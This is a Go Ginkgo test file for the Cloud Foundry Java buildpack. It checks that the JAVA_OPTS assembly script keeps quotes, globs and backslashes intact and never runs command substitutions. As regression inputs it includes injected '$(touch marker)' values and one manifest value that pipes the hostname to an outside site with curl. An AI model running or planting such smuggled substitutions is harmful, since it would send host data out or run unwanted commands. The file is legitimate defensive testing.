package frameworks_test

import (
	"bytes"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	"github.com/cloudfoundry/java-buildpack/src/java/common"
	"github.com/cloudfoundry/java-buildpack/src/java/frameworks"
	"github.com/cloudfoundry/java-buildpack/src/java/javaexec"
	"github.com/cloudfoundry/libbuildpack"
)

func newJavaOptsContext(buildDir, cacheDir, depsDir string) *common.Context {
	logger := libbuildpack.NewLogger(GinkgoWriter)
	manifest := &libbuildpack.Manifest{}
	installer := &libbuildpack.Installer{}
	stager := libbuildpack.NewStager([]string{buildDir, cacheDir, depsDir, "0"}, logger, manifest)
	return &common.Context{
		Stager:    stager,
		Manifest:  manifest,
		Installer: installer,
		Log:       logger,
		Command:   &libbuildpack.Command{},
	}
}

var _ = Describe("Java Opts Writer", func() {
	var (
		buildDir string
		cacheDir string
		depsDir  string
		ctx      *common.Context
	)

	BeforeEach(func() {
		var err error
		buildDir, err = os.MkdirTemp("", "build")
		Expect(err).NotTo(HaveOccurred())
		cacheDir, err = os.MkdirTemp("", "cache")
		Expect(err).NotTo(HaveOccurred())
		depsDir, err = os.MkdirTemp("", "deps")
		Expect(err).NotTo(HaveOccurred())
		ctx = newJavaOptsContext(buildDir, cacheDir, depsDir)
	})

	AfterEach(func() {
		os.Unsetenv("JAVA_OPTS")
		os.RemoveAll(buildDir)
		os.RemoveAll(cacheDir)
		os.RemoveAll(depsDir)
	})

	Describe("CreateJavaOptsAssemblyScript", func() {
		setupScript := func(_ string, optsFileContent string) string {
			err := frameworks.CreateJavaOptsAssemblyScript(ctx)
			Expect(err).NotTo(HaveOccurred())

			optsDir := filepath.Join(depsDir, "0", "java_opts")
			Expect(os.MkdirAll(optsDir, 0755)).To(Succeed())
			Expect(os.WriteFile(filepath.Join(optsDir, "42_agent.opts"), []byte(optsFileContent), 0644)).To(Succeed())

			return filepath.Join(depsDir, "0", "profile.d", "00_java_opts.sh")
		}

		runWithEnv := func(scriptPath, javaOpts, bashExpr string) (string, error) {
			cmd := exec.Command("bash", "-c", "source "+scriptPath+" && "+bashExpr)
			cmd.Env = append(os.Environ(),
				"JAVA_OPTS="+javaOpts,
				"DEPS_DIR="+depsDir,
				"HOME=/home/vcap/app",
			)
			output, err := cmd.CombinedOutput()
			return string(output), err
		}

		runWithCustomRuntimeEnv := func(scriptPath, javaOpts, bashExpr, runtimeDepsDir, runtimeHome string) (string, error) {
			cmd := exec.Command("bash", "-c", "source "+scriptPath+" && "+bashExpr)
			cmd.Env = append(os.Environ(),
				"JAVA_OPTS="+javaOpts,
				"DEPS_DIR="+runtimeDepsDir,
				"HOME="+runtimeHome,
			)
			output, err := cmd.CombinedOutput()
			return string(output), err
		}

		runScript := func(javaOpts string, optsFileContent string) (string, error) {
			scriptPath := setupScript(javaOpts, optsFileContent)
			return runWithEnv(scriptPath, javaOpts, `printf '%s\n' "$JAVA_OPTS"`)
		}

		// runStartCommand simulates the actual JVM invocation. At launch the
		// start command is:
		//   exec $DEPS_DIR/<idx>/bin/javaexec "$JAVA_HOME/bin/java" <args>
		// where the javaexec launcher tokenizes $JAVA_OPTS without a shell.
		// This sources the profile.d assembly script to build $JAVA_OPTS, then
		// tokenizes it with the real launcher, returning the argument list java
		// would receive (one arg per line).
		// Stderr is captured separately so that WARNING messages from the
		// assembly script do not pollute the JAVA_OPTS value passed to the
		// tokenizer (warnings are diagnostic, not part of the value).
		runStartCommand := func(javaOpts string, optsFileContent string) (string, error) {
			scriptPath := setupScript(javaOpts, optsFileContent)
			cmd := exec.Command("bash", "-c", "source "+scriptPath+` && printf '%s' "$JAVA_OPTS"`)
			cmd.Env = append(os.Environ(),
				"JAVA_OPTS="+javaOpts,
				"DEPS_DIR="+depsDir,
				"HOME=/home/vcap/app",
			)
			var stdout, stderr bytes.Buffer
			cmd.Stdout = &stdout
			cmd.Stderr = &stderr
			if err := cmd.Run(); err != nil {
				return stderr.String() + stdout.String(), err
			}
			tokens := javaexec.TokenizeJavaOpts(stdout.String())
			return strings.Join(tokens, "\n") + "\n", nil
		}

		It("handles multiline JAVA_OPTS from YAML block scalar without sed error", func() {
			// Reproduce the manifest pattern:
			//   JAVA_OPTS: >
			//     -javaagent:$HOME/BOOT-INF/lib/agent.jar
			//     -XX:+UseZGC
			// YAML '>' folds newlines to spaces, but CF may deliver them as literal newlines
			multilineJavaOpts := "-javaagent:$HOME/BOOT-INF/lib/agent.jar\n-XX:+UseZGC\n-XX:+AlwaysPreTouch"

			output, err := runScript(multilineJavaOpts, "-javaagent:somepath.jar $JAVA_OPTS")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring("-XX:+UseZGC"))
			// $HOME must expand even when JAVA_OPTS contains newlines
			Expect(output).To(ContainSubstring("-javaagent:/home/vcap/app/BOOT-INF/lib/agent.jar"))
			Expect(output).NotTo(ContainSubstring("$HOME"))
		})

		It("strips carriage returns (CRLF) from multiline JAVA_OPTS", func() {
			// Windows-edited manifests may deliver JAVA_OPTS with \r\n line endings.
			// tr '\n' ' ' strips \n but leaves \r, corrupting JVM args (e.g. -Dfoo=bar\r).
			crlfJavaOpts := "-Dfoo=bar\r\n-Dbaz=qux\r\n"
			output, err := runScript(crlfJavaOpts, "$JAVA_OPTS")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring("-Dfoo=bar"))
			Expect(output).To(ContainSubstring("-Dbaz=qux"))
			Expect(output).NotTo(ContainSubstring("\r"))
		})

		It("handles pipe character in JAVA_OPTS (e.g. javaagent options) without sed error", func() {
			// Reproduce the manifest pattern:
			//   JAVA_OPTS: >
			//     -javaagent:$HOME/BOOT-INF/lib/jfr-exporter.jar=enableExecutorMBeans|disableMyFeature
			pipeJavaOpts := "-javaagent:$HOME/BOOT-INF/lib/jfr-exporter.jar=enableExecutorMBeans|disableMyFeature"

			output, err := runScript(pipeJavaOpts, "-javaagent:somepath.jar $JAVA_OPTS")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring("enableExecutorMBeans|disableMyFeature"))
		})

		It("expands $HOME in opts file content", func() {
			output, err := runScript("", "-javaagent:$HOME/BOOT-INF/lib/agent.jar")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring("-javaagent:/home/vcap/app/BOOT-INF/lib/agent.jar"))
		})

		It("preserves ampersand and backslash in $HOME replacement", func() {
			scriptPath := setupScript("", "-javaagent:$HOME/BOOT-INF/lib/agent.jar")
			customHome := `/tmp/home&dir\sub`
			output, err := runWithCustomRuntimeEnv(scriptPath, "", `printf '%s\n' "$JAVA_OPTS"`, depsDir, customHome)
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring("-javaagent:" + customHome + "/BOOT-INF/lib/agent.jar"))
		})

		It("expands $DEPS_DIR in opts file content", func() {
			output, err := runScript("", "-Djava.security.properties=$DEPS_DIR/0/security.properties")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring("-Djava.security.properties=" + depsDir + "/0/security.properties"))
		})

		It("expands arbitrary runtime environment variables in opts file content", func() {
			os.Setenv("MY_RUNTIME_VAR", "512m")
			defer os.Unsetenv("MY_RUNTIME_VAR")
			output, err := runScript("", "-Dmem=$MY_RUNTIME_VAR -Dother=${MY_RUNTIME_VAR}")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring("-Dmem=512m -Dother=512m"))
		})

		It("resolves the trusted $(nproc) token to a processor count", func() {
			// The buildpack emits -XX:ActiveProcessorCount=$(nproc); it must be
			// resolved to a number even though arbitrary command substitutions
			// are not executed.
			output, err := runScript("", "-XX:ActiveProcessorCount=$(nproc)")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(MatchRegexp(`-XX:ActiveProcessorCount=[0-9]+`))
			Expect(output).NotTo(ContainSubstring("nproc"))
		})

		It("warns when an unresolved command substitution survives in opts content", func() {
			// A buildpack-emitted $(...) or backtick other than $(nproc) is not
			// executed and would reach the JVM literally; the script must warn.
			output, err := runScript("", "-Dwhen=$(date)")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring("WARNING: unresolved command substitution"))

			output, err = runScript("", "-Dwhen=`date`")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring("WARNING: unresolved command substitution"))
		})

		It("warning for user JAVA_OPTS command substitution shows matching token, not full value", func() {
			// Warning must identify the offending $(...) fragment without dumping
			// the entire JAVA_OPTS string (which may be long or contain secrets).
			// Use `true` as bashExpr so only the WARNING (stderr) appears in combined output.
			scriptPath := setupScript("", "$JAVA_OPTS")
			output, err := runWithEnv(scriptPath,
				`-Dsafe=before $( hostname | wc -l ) -Dsafe=after`,
				`true`,
			)
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring("WARNING"))
			// Warning shows the $(...) fragment
			Expect(output).To(ContainSubstring("$("))
			Expect(output).To(ContainSubstring("hostname"))
			// Warning must NOT dump the full JAVA_OPTS value
			Expect(output).NotTo(ContainSubstring("-Dsafe=before"))
			Expect(output).NotTo(ContainSubstring("-Dsafe=after"))
		})

		It("does not execute command substitutions embedded in opts file content", func() {
			marker := filepath.Join(cacheDir, "pwned_marker")
			Expect(os.Remove(marker)).To(Or(Succeed(), MatchError(os.ErrNotExist)))
			output, err := runScript("", "-Dx=$(touch "+marker+")")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			_, statErr := os.Stat(marker)
			Expect(os.IsNotExist(statErr)).To(BeTrue(), "command substitution was executed; marker file created")
			Expect(output).To(ContainSubstring("$(touch"))
		})

		It("preserves literal -n from opts file content", func() {
			output, err := runScript("", "-n")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(strings.TrimSpace(output)).To(Equal("-n"))
		})

		It("does not execute command substitution in user JAVA_OPTS (#1301, no eval)", func() {
			// The #1301 user-facing scenario: a command substitution in the
			// user-provided JAVA_OPTS env must reach java as a literal argument,
			// never be executed. Proven end-to-end through the real assembly script
			// and the real javaexec tokenizer, with a marker file as a second guard.
			marker := filepath.Join(cacheDir, "user_pwned_marker")
			Expect(os.Remove(marker)).To(Or(Succeed(), MatchError(os.ErrNotExist)))
			// Quoted so the value (which contains a space) stays a single argument.
			output, err := runStartCommand(`-Dx="$(touch `+marker+`)"`, "$JAVA_OPTS")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			_, statErr := os.Stat(marker)
			Expect(os.IsNotExist(statErr)).To(BeTrue(), "command substitution was executed; marker file created")
			// java receives the single literal argument, $(...) intact.
			Expect(strings.TrimSpace(output)).To(Equal("-Dx=$(touch " + marker + ")"))
		})

		It(`treats \$VAR as a literal $ in user JAVA_OPTS (Ruby buildpack parity)`, func() {
			// Ruby buildpack: eval treated \$VAR as literal $VAR (not expanded).
			// Users migrating with \$HOME should get $HOME literally, not the expanded path.
			// The test helper sets HOME=/home/vcap/app so we can confirm non-expansion.
			output, err := runScript(`-Dfoo=\$HOME`, "$JAVA_OPTS")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring(`-Dfoo=$HOME`))
			Expect(output).NotTo(ContainSubstring("-Dfoo=/home/vcap/app"))
		})

		It(`treats \$VAR as a literal $ in opts file content (Ruby buildpack parity)`, func() {
			output, err := runScript("", `-Dexample=\$MY_VAR`)
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring(`-Dexample=$MY_VAR`))
		})

		It("expands $VAR references in user JAVA_OPTS", func() {
			// $PWD in user JAVA_OPTS must expand to the working directory,
			// matching pre-eval behaviour. Command substitutions must still not execute.
			wd, _ := os.Getwd()
			output, err := runScript(
				`-Dapplicationinsights.configuration.file=$PWD/BOOT-INF/classes/applicationinsights.json`,
				"$JAVA_OPTS",
			)
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring("-Dapplicationinsights.configuration.file=" + wd + "/BOOT-INF/classes/applicationinsights.json"))
			Expect(output).NotTo(ContainSubstring("$PWD"))
		})

		It("expands $HOME in user JAVA_OPTS (javaagent path use case)", func() {
			output, err := runScript(
				`-javaagent:$HOME/BOOT-INF/lib/agent.jar`,
				"$JAVA_OPTS",
			)
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring("-javaagent:/home/vcap/app/BOOT-INF/lib/agent.jar"))
			Expect(output).NotTo(ContainSubstring("$HOME"))
		})

		It("expands ${VAR} braces form in user JAVA_OPTS", func() {
			wd, _ := os.Getwd()
			output, err := runScript(
				`-Dconfig.file=${PWD}/config/app.properties`,
				"$JAVA_OPTS",
			)
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring("-Dconfig.file=" + wd + "/config/app.properties"))
			Expect(output).NotTo(ContainSubstring("${PWD}"))
		})

		// Regression tests for issue #1301: xargs strips quotes, breaking quoted JVM args
		It("preserves quoted value with spaces in JAVA_OPTS", func() {
			// JAVA_OPTS='-Dfoo="bar baz"' — xargs removes the quotes from USER_JAVA_OPTS,
			// so when eval exec java $JAVA_OPTS is called, -Dfoo=bar and baz become separate args
			output, err := runScript(`-Dfoo="bar baz"`, "$JAVA_OPTS")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring(`-Dfoo="bar baz"`))
		})

		It("preserves cron expression with glob characters in JAVA_OPTS", func() {
			// JAVA_OPTS='-DcronSched="0 */7 * * * *"' — xargs strips quotes, then * expands via glob
			// when eval exec java $JAVA_OPTS is invoked, corrupting the cron expression
			output, err := runScript(`-DcronSched="0 */7 * * * *"`, "$JAVA_OPTS")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring(`-DcronSched="0 */7 * * * *"`))
		})

		It("preserves multiple quoted args in JAVA_OPTS", func() {
			// Multiple quoted values — xargs strips all quotes, each space-containing value splits
			output, err := runScript(`-Dfoo="bar baz" -Dother="qux quux"`, "$JAVA_OPTS")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring(`-Dfoo="bar baz"`))
			Expect(output).To(ContainSubstring(`-Dother="qux quux"`))
		})

		It("preserves backslashes in JAVA_OPTS values", func() {
			// xargs treats backslash as escape char: C:\path\to\app -> C:pathtoapp
			// Affects regex patterns and any path using backslash notation
			output, err := runScript(`-DregEx="[a-z]+(.*)" -Dpattern=foo\|bar`, "$JAVA_OPTS")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring(`-DregEx="[a-z]+(.*)"`))
			Expect(output).To(ContainSubstring(`foo\|bar`))
		})

		It("preserves leading -n argument in JAVA_OPTS", func() {
			output, err := runScript(`-n -Dfoo=bar`, "$JAVA_OPTS")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring(`-n -Dfoo=bar`))
		})

		It("preserves ampersand in JAVA_OPTS values during placeholder substitution", func() {
			output, err := runScript(`-Dfoo=a&b`, "$JAVA_OPTS")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring(`-Dfoo=a&b`))
		})

		It("preserves backslashes in JAVA_OPTS values during placeholder substitution", func() {
			output, err := runScript(`-Dpath=C:\tmp\app`, "$JAVA_OPTS")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring(`-Dpath=C:\tmp\app`))
		})

		It("preserves double backslashes in JAVA_OPTS values during placeholder substitution", func() {
			output, err := runScript(`-Dpath=C:\\double`, "$JAVA_OPTS")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring(`-Dpath=C:\\double`))
		})

		// Full invocation cycle tests for issue #1301:
		// Verify that javaexec tokenizes $JAVA_OPTS without a shell, so glob chars,
		// pipes, and shell metacharacters are never expanded or executed.
		It("does not glob-expand * in cron expression when invoking java", func() {
			output, err := runStartCommand(`-DcronSched="0 */7 * * * *"`, "$JAVA_OPTS")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			// Java receives exactly one arg: -DcronSched=0 */7 * * * *
			Expect(strings.TrimSpace(output)).To(Equal("-DcronSched=0 */7 * * * *"))
		})

		It("delivers exact issue-#1301 reproducer: quoted value + cron as separate args", func() {
			// Exact reproducer from the bug report:
			//   JAVA_OPTS='-Dfoo="bar baz" -DcronSched="0 */7 * * * *"'
			// Old xargs path: quotes stripped → "bar baz" splits → * globs → ClassNotFoundException
			output, err := runStartCommand(`-Dfoo="bar baz" -DcronSched="0 */7 * * * *"`, "$JAVA_OPTS")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			lines := strings.Split(strings.TrimSpace(output), "\n")
			Expect(lines).To(HaveLen(2))
			Expect(lines[0]).To(Equal("-Dfoo=bar baz"))
			Expect(lines[1]).To(Equal("-DcronSched=0 */7 * * * *"))
		})

		It("passes pipe character in JAVA_OPTS through to java without shell interpretation", func() {
			// Old sed-based assembly (5.0.2) used | as sed delimiter, so a | in JAVA_OPTS
			// caused a sed syntax error and dropped options. javaexec never invokes a shell.
			output, err := runStartCommand(`-Dpattern=foo|bar -Dother=baz`, "$JAVA_OPTS")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			lines := strings.Split(strings.TrimSpace(output), "\n")
			Expect(lines).To(HaveLen(2))
			Expect(lines[0]).To(Equal("-Dpattern=foo|bar"))
			Expect(lines[1]).To(Equal("-Dother=baz"))
		})

		It("passes shell metacharacters (&, ;, >) through to java as literals", func() {
			output, err := runStartCommand(`-Da=x&y -Db=a;b -Dc=a>b`, "$JAVA_OPTS")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			lines := strings.Split(strings.TrimSpace(output), "\n")
			Expect(lines).To(HaveLen(3))
			Expect(lines[0]).To(Equal("-Da=x&y"))
			Expect(lines[1]).To(Equal("-Db=a;b"))
			Expect(lines[2]).To(Equal("-Dc=a>b"))
		})

		It("handles full manifest JAVA_OPTS with all edge cases (issue #1301)", func() {
			// Reproduces the exact manifest scenario reported by users:
			//   JAVA_OPTS: >-
			//     -Dfoo="bar baz"
			//     -DcronSched="0 */7 * * * *"
			//     -Dbar=$HOME
			//     -Dwhere=$( hostname | tr '\n' | curl -v 'https://testasdkjfhakl.me')
			//     -Dmyfile=c:\\first\\second\\file.txt;ext
			// YAML >- folds newlines to spaces, delivering this as one line.
			javaOpts := `-Dfoo="bar baz" -DcronSched="0 */7 * * * *" -Dbar=$HOME -Dwhere=$( hostname | tr '\n' | curl -v 'https://testasdkjfhakl.me') -Dmyfile=c:\\first\\second\\file.txt;ext`
			output, err := runStartCommand(javaOpts, "$JAVA_OPTS")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			lines := strings.Split(strings.TrimSpace(output), "\n")
			Expect(lines).To(HaveLen(5))
			Expect(lines[0]).To(Equal("-Dfoo=bar baz"))
			Expect(lines[1]).To(Equal("-DcronSched=0 */7 * * * *"))
			Expect(lines[2]).To(Equal("-Dbar=/home/vcap/app")) // $HOME expanded by profile.d
			// $( hostname | ...) passes literally as one arg — not executed, not split
			Expect(lines[3]).To(ContainSubstring("-Dwhere=$("))
			Expect(lines[3]).To(ContainSubstring("hostname"))
			// \\ → \ by javaexec; ; is literal
			Expect(lines[4]).To(Equal(`-Dmyfile=c:\first\second\file.txt;ext`))
		})

		// Regression test: eval mangles .opts content containing literal double quotes.
		// e.g. Datadog writes -Ddd.service="myapp" into its .opts file; the inner "
		// terminates the outer eval "..." string, stripping the value.
		It("preserves double-quoted values from .opts file content", func() {
			output, err := runScript("", `-Ddd.service="myapp"`)
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring(`-Ddd.service="myapp"`))
		})

		It("preserves backslashes in .opts file content", func() {
			output, err := runScript("", `-Dpattern=foo\|bar`)
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(output).To(ContainSubstring(`-Dpattern=foo\|bar`))
		})

		// Expanded variable values with spaces: same POSIX rules as old eval.
		// Unquoted $VAR whose value contains spaces → split (javaexec treats spaces as
		// word separators). Double-quoted "$VAR" → one token. Quote your references.
		It("splits unquoted expanded $VAR with spaces into separate tokens (POSIX word-split)", func() {
			os.Setenv("MY_SPACED_VAR", "hello world")
			defer os.Unsetenv("MY_SPACED_VAR")
			output, err := runStartCommand(`-Dfoo=$MY_SPACED_VAR`, "$JAVA_OPTS")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			lines := strings.Split(strings.TrimSpace(output), "\n")
			// Unquoted: space splits into two JVM arguments, same as old eval.
			Expect(lines).To(HaveLen(2))
			Expect(lines[0]).To(Equal("-Dfoo=hello"))
			Expect(lines[1]).To(Equal("world"))
		})

		It(`keeps double-quoted "$VAR" with spaces as one JVM argument`, func() {
			os.Setenv("MY_SPACED_VAR", "hello world")
			defer os.Unsetenv("MY_SPACED_VAR")
			output, err := runStartCommand(`-Dfoo="$MY_SPACED_VAR"`, "$JAVA_OPTS")
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			// Double-quoted: javaexec treats the quoted region as one token.
			Expect(strings.TrimSpace(output)).To(Equal("-Dfoo=hello world"))
		})

		It(`keeps double-quoted "$VAR" with spaces in .opts content as one JVM argument`, func() {
			os.Setenv("MY_SPACED_VAR", "hello world")
			defer os.Unsetenv("MY_SPACED_VAR")
			output, err := runStartCommand("", `-Dfoo="$MY_SPACED_VAR"`)
			Expect(err).NotTo(HaveOccurred(), "script failed with output: %s", output)
			Expect(strings.TrimSpace(output)).To(Equal("-Dfoo=hello world"))
		})
	})
})
